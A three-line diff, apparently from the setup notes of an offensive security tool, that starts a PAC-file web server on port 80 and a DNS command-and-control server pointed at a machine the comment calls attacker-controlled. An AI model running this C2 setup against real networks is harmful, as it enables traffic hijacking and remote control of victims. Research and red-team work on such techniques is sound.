@@ -1,0 +1,3 @@
+./pac_websrv.py 80
+# Assume attacker controlled machine IP is 192.168.2.1
+./dns_cnc_srv.py -wsrv 192.168.2.1
